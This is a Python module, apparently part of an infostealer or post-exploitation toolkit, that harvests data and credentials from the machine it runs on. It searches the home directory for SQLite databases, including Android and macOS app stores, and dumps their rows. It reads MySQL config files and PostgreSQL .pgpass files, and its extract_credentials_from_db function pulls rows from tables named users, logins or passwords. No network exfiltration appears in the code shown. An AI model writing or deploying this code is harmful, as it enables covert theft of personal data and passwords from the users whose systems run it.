# Database Dumping Module
import platform
import os
import sqlite3
import glob
import json
from pathlib import Path

class DatabaseDumper:
    def __init__(self):
        self.system = platform.system()
        self.databases = []
        
    def dump_all(self):
        """Dump all accessible databases"""
        results = {
            "system": self.system,
            "databases": {}
        }
        
        # Dump different database types
        results["databases"]["sqlite"] = self.dump_sqlite()
        results["databases"]["mysql"] = self.dump_mysql()
        results["databases"]["postgresql"] = self.dump_postgresql()
        
        return results
    
    def dump_sqlite(self):
        """Dump SQLite databases"""
        try:
            home = Path.home()
            
            # Common SQLite locations
            sqlite_paths = [
                home / ".sqlite*",
                home / "*.db",
                home / "*.sqlite",
                home / "*.sqlite3",
                home / "Android" / "data" / "*" / "databases" / "*.db",
                home / "Library" / "Application Support" / "*" / "*.db",
                home / ".local" / "share" / "*" / "*.db",
            ]
            
            databases = []
            
            for pattern in sqlite_paths:
                for db_path in glob.glob(str(pattern)):
                    if os.path.isfile(db_path):
                        try:
                            db_info = self._dump_sqlite_db(db_path)
                            if db_info:
                                databases.append({
                                    "path": db_path,
                                    "info": db_info
                                })
                        except Exception as e:
                            databases.append({
                                "path": db_path,
                                "error": str(e)
                            })
            
            return {"success": True, "databases": databases[:50], "count": len(databases)}
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def _dump_sqlite_db(self, db_path: str):
        """Dump a single SQLite database"""
        try:
            conn = sqlite3.connect(db_path)
            cursor = conn.cursor()
            
            # Get table list
            cursor.execute("SELECT name FROM sqlite_master WHERE type='table'")
            tables = [row[0] for row in cursor.fetchall()]
            
            db_info = {
                "tables": tables,
                "table_count": len(tables),
                "data": {}
            }
            
            # Dump each table (limit rows)
            for table in tables:
                try:
                    cursor.execute(f"SELECT * FROM {table} LIMIT 10")
                    rows = cursor.fetchall()
                    
                    cursor.execute(f"PRAGMA table_info({table})")
                    columns = [row[1] for row in cursor.fetchall()]
                    
                    db_info["data"][table] = {
                        "columns": columns,
                        "rows": [dict(zip(columns, row)) for row in rows[:10]]
                    }
                except:
                    pass
            
            conn.close()
            return db_info
        except Exception as e:
            return {"error": str(e)}
    
    def dump_mysql(self):
        """Dump MySQL databases"""
        try:
            # Check for MySQL credentials
            config_paths = [
                Path.home() / ".my.cnf",
                Path.home() / "my.cnf",
                "/etc/mysql/my.cnf",
                "/etc/my.cnf",
            ]
            
            configs = []
            
            for config_path in config_paths:
                if config_path.exists():
                    try:
                        with open(config_path, 'r') as f:
                            configs.append({
                                "path": str(config_path),
                                "content": f.read()[:1000]
                            })
                    except:
                        pass
            
            return {"success": True, "configs": configs}
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def dump_postgresql(self):
        """Dump PostgreSQL databases"""
        try:
            # Check for PostgreSQL credentials
            config_paths = [
                Path.home() / ".pgpass",
                Path.home() / ".postgresql" / "pgpass",
            ]
            
            configs = []
            
            for config_path in config_paths:
                if config_path.exists():
                    try:
                        with open(config_path, 'r') as f:
                            configs.append({
                                "path": str(config_path),
                                "content": f.read()[:1000]
                            })
                    except:
                        pass
            
            return {"success": True, "configs": configs}
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def find_database_files(self):
        """Find all database files on the system"""
        try:
            extensions = ['.db', '.sqlite', '.sqlite3', '.db3', '.mdb', '.accdb']
            
            home = Path.home()
            databases = []
            
            for ext in extensions:
                for db_file in home.rglob(f"*{ext}"):
                    if db_file.is_file():
                        try:
                            databases.append({
                                "path": str(db_file),
                                "size": db_file.stat().st_size
                            })
                        except:
                            pass
            
            return {"success": True, "databases": databases[:100], "count": len(databases)}
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def extract_credentials_from_db(self, db_path: str):
        """Extract credentials from a database"""
        try:
            creds = []
            
            conn = sqlite3.connect(db_path)
            cursor = conn.cursor()
            
            # Get table list
            cursor.execute("SELECT name FROM sqlite_master WHERE type='table'")
            tables = [row[0] for row in cursor.fetchall()]
            
            # Search for credentials in tables
            credential_tables = ['users', 'accounts', 'credentials', 'logins', 'passwords']
            
            for table in tables:
                if any(ct in table.lower() for ct in credential_tables):
                    try:
                        cursor.execute(f"SELECT * FROM {table} LIMIT 50")
                        rows = cursor.fetchall()
                        
                        cursor.execute(f"PRAGMA table_info({table})")
                        columns = [row[1] for row in cursor.fetchall()]
                        
                        creds.append({
                            "table": table,
                            "columns": columns,
                            "data": [dict(zip(columns, row)) for row in rows]
                        })
                    except:
                        pass
            
            conn.close()
            
            return {"success": True, "credentials": creds}
        except Exception as e:
            return {"success": False, "error": str(e)}


def dump_databases():
    """Quick database dump function"""
    dd = DatabaseDumper()
    return dd.dump_all()


def find_database_files():
    """Quick database file finder function"""
    dd = DatabaseDumper()
    return dd.find_database_files()
